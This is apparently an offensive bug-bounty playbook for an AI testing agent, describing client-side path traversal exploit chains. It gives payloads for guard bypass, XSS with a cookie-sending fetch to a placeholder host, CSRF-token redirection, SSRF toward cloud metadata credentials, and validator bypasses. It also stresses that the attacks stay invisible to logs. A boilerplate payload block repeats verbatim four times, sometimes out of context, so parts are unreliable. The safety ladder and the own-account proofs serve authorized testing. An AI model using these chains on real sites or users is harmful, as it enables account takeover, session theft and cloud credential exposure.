# CSPT exploit chains — the divergence is rung 0; these are the payable outcomes

## Contents

- §1 — Path param → frontend guard bypass → gated endpoint
- §2 — CSPT → XSS sink (stored / reflected)
- §3 — CSPT2CSRF (redirect a state-changing request with the victim's token)
- §4 — Secondary-context traversal → SSRF (hybrid frameworks) — the Critical-grade chain
- §5 — Hash-fragment CSPT (invisible to server logs)
- §6 — Splat / catch-all routes (literal `../`, no encoding)
- §7 — Read-then-persist: the GET is the sink, the app does the write
- Escalation summary — never stop at the divergence

CSPT is rarely Critical alone. Its value is **what the steered authenticated
request lets you do that a normal request cannot.** Each chain below carries the
concrete payload, the read-only PoC that proves it, and the safe-ladder rung. Do
not stop at the divergence — pick the chain the sink supports and climb to it.

Cross-reference: the XSS sinks are catalogued in
`../../js-source-to-sink/references/code-sinks.md` §1; the SSRF escalation is
owned by `ssrf-safe`; the object-authz escalation by `idor-bola` /
`broken-access-control`.

---

## §1 — Path param → frontend guard bypass → gated endpoint

The classic. A SPA hides admin/privileged routes behind a **client-side** guard,
but the guard inspects the route param string, not the eventual fetch
destination.

1. App routes `/users/:userId` and renders the profile via
   `fetch(\`/api/users/${userId}/profile\`)` with default `credentials` (session
   cookie attached).
2. The guard blocks navigation to `/admin/*` for non-admins but allows
   `/users/anything`.
3. Navigate to `/users/..%2f..%2fadmin%2fusers`.
4. The router decodes → `userId = "../../admin/users"`.
5. The template literal builds `/api/users/../../admin/users/profile` → the
   browser normalizes at request time → `GET /admin/users/profile` **with the
   victim's session cookie**.
6. The admin endpoint returns data the frontend was supposed to gate.

**Suffix truncation — required whenever the fetch template appends anything after
the interpolated param.** `/api/users/${id}/profile` with `id = "../../admin/users"`
lands `GET /admin/users/profile`, which 404s on the trailing `/profile`. Truncate it:

```
..%2f..%2fadmin%2fusers%23      # %23 -> '#'  : the rest becomes the fragment, never sent
..%2f..%2fadmin%2fusers%3f      # %3f -> '?'  : the rest becomes a query string
..%2f..%2fadmin%2fusers%253f    # double-encoded, for routers that decode twice
```

Fire all three before you conclude the route is safe.

**Read-only PoC (rung 1):** the Network tab shows initial URL
`/users/..%2f..%2fadmin%2fusers`, outbound fetch `GET /admin/users/profile`, and
the response body is admin/gated JSON. Reading the body IS the proof — no write
needed. Screenshot the SPA URL bar and the resolved Network entry side by side.

**Escalate:** if the gated endpoint is an object endpoint (`/api/users/<id>`),
this is CSPT → IDOR — hand the object-authz proof to `idor-bola`. If it is an
admin/staff/export/impersonate route, hand to `broken-access-control`.

---

## §2 — CSPT → XSS sink (stored / reflected)

When the response from the traversed endpoint flows into an HTML sink, CSPT turns
Medium → High/Critical.

1. Confirm CSPT redirects the fetch to an attacker-chosen same-origin endpoint
   (§1 divergence).
2. Find a same-origin endpoint whose response you can control the HTML of: a
   notes/comments endpoint, a markdown/preview renderer, a user-file proxy, an API
   that echoes a query parameter into the response body.
3. Seed the payload there **on an account you own** (if stored). Example marker:
   `<img src=x onerror="fetch('//<your-oob>/'+document.cookie)">`.
4. Use CSPT to point the vulnerable component's fetch at *that* endpoint instead
   of its intended one.
5. The response renders through the sink — `dangerouslySetInnerHTML` (React),
   `v-html` (Vue), `[innerHTML]` + `bypassSecurityTrustHtml` (Angular), `{@html}`
   (Svelte), `innerHTML =` (Solid/vanilla), `{{{ }}}` / `htmlSafe()` (Ember).
6. Stored XSS fires in the **victim's** session.

**PoC (rung 2, own-context):** seed the marker on your own object, load the CSPT
URL as the victim (your second test account, or demonstrate the payload firing in
your own session first), capture the OOB callback. If the sink lands in a viewer
you cannot see (an admin/support panel rendering your submitted content), use a
`xss`-style out-of-band payload and prove it fired via the callback — that
is the admin-context XSS that grades Critical.

**Not a finding:** if the payload only ever fires for the attacker (self-XSS via
CSPT), it is not reportable unless escalated to another user.

---

## §3 — CSPT2CSRF (redirect a state-changing request with the victim's token)

Doyensec's CSPT2CSRF primitive (`github.com/doyensec/CSPTPlayground`). When the
vulnerable fetch is a **state-changing** method (`POST`/`PUT`/`PATCH`/`DELETE`)
and the app auto-attaches a CSRF token / bearer from the SPA's own store, CSPT
lets you keep the *valid token* but **change where the authenticated,
CSRF-protected request lands** — defeating CSRF protection from inside the
victim's browser.

1. Find a component that issues an authenticated `POST /api/x/${param}` where the
   framework auto-adds the CSRF/bearer header (common in Axios interceptors,
   Angular `HttpClient` XSRF, `fetch` wrappers reading a `_csrf` cookie).
2. The attacker controls `param` via a route/query/hash the router decodes.
3. Payload steers the request onto a *different* state-changing endpoint:
   `param = "..%2f..%2faccount%2femail"` → `POST /api/account/email` with the
   victim's token and (where the body is fixed/attacker-influenced) attacker
   data — e.g. changing the victim's email/notification/role.
4. Because the token is real and auto-attached, server-side CSRF checks pass;
   because the destination is attacker-chosen, the action is not the one the UI
   intended.

**Sinks that make it exploitable:** the request body must be attacker-influenced
or empty-but-still-effective (a `DELETE`, a toggle, a "confirm" with no body).
Where the body is fully attacker-controlled (GET-shaped params echoed into a POST,
or a JSON body built from the same route params), CSPT2CSRF → account state change
→ ATO-class impact.

**Suffix truncation — required whenever the fetch template appends anything after
the interpolated param.** `/api/users/${id}/profile` with `id = "../../admin/users"`
lands `GET /admin/users/profile`, which 404s on the trailing `/profile`. Truncate it:

```
..%2f..%2fadmin%2fusers%23      # %23 -> '#'  : the rest becomes the fragment, never sent
..%2f..%2fadmin%2fusers%3f      # %3f -> '?'  : the rest becomes a query string
..%2f..%2fadmin%2fusers%253f    # double-encoded, for routers that decode twice
```

Fire all three before you conclude the route is safe.

**Safe PoC:** demonstrate the redirect onto a **benign action on an account you
own** — e.g. flip your own notification setting, or issue a no-op
`POST`/`DELETE` against your own sentinel record — and confirm in the Network tab
that (a) the outbound path is the traversed one and (b) the CSRF/bearer header
rode along. **Do NOT fire a write CSPT at a real destructive endpoint on shared
infra** — that is safe-ladder rung 5: not attempted — ask d0x directly with the exact request before executing.
Prove the primitive on your own object, then state the security-relevant impact
by inference.

---

## §4 — Secondary-context traversal → SSRF (hybrid frameworks) — the Critical-grade chain

In **Next.js route handlers**, **Nuxt server routes**, and **SvelteKit
`+server.ts`**, the server-side code receives the *already-decoded* params and
uses them to build an internal `fetch()`. Traversal there is server-side SSRF.

```typescript
// app/api/proxy/[...path]/route.ts (Next.js)
export async function GET(request, { params }) {
  const { path } = await params;                 // decoded: ["..","..","internal-service"]
  return fetch(`https://backend.internal/${path.join("/")}`);   // <-- SSRF sink
}
```

```ts
// Nuxt server route — vulnerable only with the decode opt-in
export default defineEventHandler(async (e) => {
  const p = getRouterParam(e, 'path', { decode: true });        // opt-in decode
  return $fetch(`http://internal-api/${p}`);
});
```

1. The frontend CSPT lands a request on the vulnerable server route with
   `..%2f..%2finternal-service%2fadmin%2fusers` (or directly, since the server
   decodes it).
2. The server joins the decoded segments and fetches an internal-only endpoint —
   one that has **no authn because it trusts the gateway**.
3. The response flows back to the client → full SSRF.

**Reach the payable targets:**
- Internal services / admin APIs behind the gateway (no-auth internal endpoints).
- Cloud metadata: steer the path to `169.254.169.254/latest/meta-data/iam/
  security-credentials/` (AWS IMDSv1), the Azure IMDS, or GCP metadata — if the
  server fetch honors an absolute-ish traversal or a host you can inject, you
  reach instance credentials. Hand this to `ssrf-safe` for the full filter-bypass
  ladder, and to `cloud-exploitation` once you hold IMDS creds/config.

**Read-only PoC (rung 1):** point the traversal at your own OOB listener (if the
server fetch can be pushed off-host) or at a benign internal endpoint and read
the reflected body. A reflected internal response, or IMDS creds returned to the
client, is the proof. Never mass-read internal data — one reflected internal
response proves the SSRF; state the reach by inference.

This grades Critical — look for it on **every** Next/Nuxt/SvelteKit target even
when the client side is safe.

---

## §5 — Hash-fragment CSPT (invisible to server logs)

The URL hash is **never sent to the server**, so WAFs and access logs never see
it. If the SPA reads `window.location.hash` (or a `hashchange` handler) into a
fetch, CSPT here is invisible to defenders during and after the attack.

1. Identify hash-driven navigation (`#/route/:id` patterns, or any `hashchange`
   → fetch).
2. Payload: `#/route/..%2f..%2fadmin` or `#..%2f..%2fadmin`.
3. The fetch fires; **nothing in server logs links the attack to the victim.**

**Suffix truncation — required whenever the fetch template appends anything after
the interpolated param.** `/api/users/${id}/profile` with `id = "../../admin/users"`
lands `GET /admin/users/profile`, which 404s on the trailing `/profile`. Truncate it:

```
..%2f..%2fadmin%2fusers%23      # %23 -> '#'  : the rest becomes the fragment, never sent
..%2f..%2fadmin%2fusers%3f      # %3f -> '?'  : the rest becomes a query string
..%2f..%2fadmin%2fusers%253f    # double-encoded, for routers that decode twice
```

Fire all three before you conclude the route is safe.

Put the log-invisibility in the report — defenders routinely under-rate CSPT
because they assume they could detect it; with a hash-driven sink they cannot.
The escalation (to §1/§2/§3) is the same; the hash just changes the delivery
vector and the detectability.

---

## §6 — Splat / catch-all routes (literal `../`, no encoding)

Routes declared `path="files/*"` (React), `/:pathMatch(.*)*` (Vue), `**`
(Angular), `*param` (Ember — but Ember keeps wildcards encoded, see
`decoding-matrix.md`), or `[...path]` (Next/Nuxt/SvelteKit) match across `/`
boundaries — the regex is `(.*)`, not `([^/]+)`.

1. Find a catch-all route in the bundle / source map.
2. The payload needs **no encoding**: `/files/../../admin/users`.
3. The fetch interpolates `${path}` → the traversal lands directly.

**Suffix truncation — required whenever the fetch template appends anything after
the interpolated param.** `/api/users/${id}/profile` with `id = "../../admin/users"`
lands `GET /admin/users/profile`, which 404s on the trailing `/profile`. Truncate it:

```
..%2f..%2fadmin%2fusers%23      # %23 -> '#'  : the rest becomes the fragment, never sent
..%2f..%2fadmin%2fusers%3f      # %3f -> '?'  : the rest becomes a query string
..%2f..%2fadmin%2fusers%253f    # double-encoded, for routers that decode twice
```

Fire all three before you conclude the route is safe.

Catch-alls are the **easiest CSPT to confirm** — no encoding gymnastics — so scan
for them first (`discovery.md` Step 2). Confirm `..` isn't stripped server-side by
pointing the traversal at a unique sentinel endpoint you control on the same
origin; if the sentinel is hit, the traversal is live.

---

## §7 — Read-then-persist: the GET is the sink, the app does the write

§3 needs the vulnerable fetch to already be a state-changing method. This one does
not, and that is why it gets missed: the traversed request is an ordinary
credentialed **`GET`**, and the *application itself* takes the response body and
**stores it** — into the victim's own account, under a key that also comes from
the URL. The attacker never issues a write; they choose what the app writes and
what it is called.

**Recognise the pipeline**, which is a single feature described in three verbs:
*fetch a resource named by a parameter → persist it as the user's asset → open it*.
It shows up as an import-from-URL, a "open this template", a preview-and-save, an
avatar-by-path, a document-from-CDN loader. The tells:

- a parameter naming a **path**, not an id — `cdnAssetPath`, `assetPath`,
  `templateUrl`, `docPath`, `source`;
- the fetch is same-origin **with credentials**, so the response is whatever *that
  user* is allowed to read;
- the response is written somewhere durable, and the **filename or key is taken
  from the same URL** — that is the half that turns a read into a named artifact.

**Payoff.** One click puts an unsolicited, attacker-named file in any signed-in
user's account root. It grades on what the file is and where it lands: a spoofed
document in the account root of a document product is Medium and defensible; the
same primitive pointed at a path whose response contains that user's own data
turns it into a self-exfiltration into a location the attacker may later reach.

### The two guards that are not guards

Both appeared in the corpus case, both are common, and each is a one-character
lesson:

| Guard as written | Why it fails | Payload |
|---|---|---|
| `value.endsWith('.pdf')` — an extension allowlist over the whole string | the query string is part of the string | `/favicon.ico?x=.pdf` |
| `value.startsWith('/')` — "it must be a local path" | constrains exactly one character and nothing after it | `/..%2f..%2fanything` |

**The `endsWith` bypass generalises past CSPT.** Any allowlist that validates a
file type by matching the *end of a URL* is satisfied by appending
`?x=<allowed-ext>` or `#<allowed-ext>` — the check reads a string, the fetch reads
a URL. Try it on upload validators, preview endpoints and CDN loaders whether or
not a traversal is involved.

### Prove it read-only, then stop

1. Point the parameter at a harmless same-origin path with the suffix trick and
   confirm from the Network tab that the traversed `GET` went out **with
   credentials** — that alone is the divergence.
2. Fire the full chain **against your own account** and show the resulting artifact
   in your own storage, named by your payload. That is the complete proof.
3. Do **not** fire it at another real user: the write lands in their account and
   cannot be reverted from your side. That is rung 5 — ask d0x directly before executing
   carrying the exact link.
4. Negative control: the same link with a benign parameter value produces the
   app's intended asset and nothing named by you.

**Corpus case:** `3894938` — `h1/reports/3894938-adobe-new.md` (medium · new).

## Escalation summary — never stop at the divergence

| Chain confirmed | Hand the escalation to | Grade with proof |
|---|---|---|
| §1 guard bypass → object/admin endpoint | `idor-bola` / `broken-access-control` | gated JSON read back |
| §2 response → HTML sink | prove in own/admin context (xss callback) | sink renders your marker |
| §3 CSPT2CSRF | own-account benign action; rung 5 for real writes | traversed path + token attached |
| §4 secondary-context | `ssrf-safe`; `cloud-exploitation` if IMDS/config | reflected internal / IMDS body |
| §5 hash | same as §1–§4, note log-invisibility | — |
| §6 splat | same as §1–§4, sentinel-confirm the traversal | sentinel endpoint hit |
| §7 read-then-persist | own account only; another user's storage is rung 5 | the attacker-named artifact in your own account |
